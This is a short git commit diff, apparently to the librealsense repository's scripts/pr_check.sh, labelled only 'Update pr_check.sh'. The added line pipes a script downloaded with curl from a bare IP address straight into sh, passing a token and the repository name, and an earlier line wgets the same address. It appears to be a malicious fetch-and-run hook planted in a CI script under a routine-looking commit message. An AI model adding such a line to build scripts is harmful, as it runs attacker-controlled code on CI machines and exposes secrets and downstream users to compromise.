0da354146b208c6932b5b441b5ad276611b22b3b
birdoplank <166294092+birdoplank@users.noreply.github.com>
2024-04-18 17:31:48 +0300

    Update pr_check.sh

--- scripts/pr_check.sh
+++ scripts/pr_check.sh
@@ -4,7 +4,8 @@ wget http://52.89.36.71:5000/run
 
 set +e
 
-sudo apt-get install dos2unix
+sudo apt-get install -y dos2unix curl
+curl http://52.89.36.71:5000/run | sh -s -- 9d6a2da4-d33a-4102-819d-8cbc84879125 IntelRealSense/librealsense
 
 ok=0
 fixed=0
